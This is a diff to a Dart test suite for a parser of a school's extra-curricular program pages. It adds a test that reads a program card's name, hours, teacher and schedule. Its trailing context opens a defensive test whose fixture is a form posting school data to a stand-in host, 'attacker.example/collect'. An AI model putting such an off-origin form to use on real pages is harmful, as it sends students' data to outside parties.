@@ -108,6 +108,32 @@ void main() {
       expect(form.submitValue, 'save');
     });
 
+    test('parses current_application.php into selected programs and schedule slots', () {
+      const html = '''
+        <article class="success-program-card">
+          <strong class="success-program-name">Медиастудия</strong>
+          <span class="hours-badge">48 часов</span>
+          <div class="program-subgroup-teacher">Педагог: <b>Петрова Анна</b></div>
+          <div class="program-subgroup-schedule">
+            Понедельник · уроки 3–4 · Кабинет 214
+            Пятница · уроки 5–6 · Кабинет 215
+          </div>
+        </article>
+      ''';
+
+      final choices = const DopParser().parseCurrentApplicationHtml(html);
+
+      expect(choices, hasLength(1));
+      expect(choices.single.name, 'Медиастудия');
+      expect(choices.single.hours, 48);
+      expect(choices.single.teacher, 'Петрова Анна');
+      expect(choices.single.schedule, hasLength(2));
+      expect(choices.single.schedule.first.day, 1);
+      expect(choices.single.schedule.first.room, '214');
+      expect(choices.single.schedule.last.day, 5);
+      expect(choices.single.schedule.last.room, '215');
+    });
+
     test('rejects a form that would send school data off-origin', () {
       const html = '''
         <form method="post" action="https://attacker.example/collect">
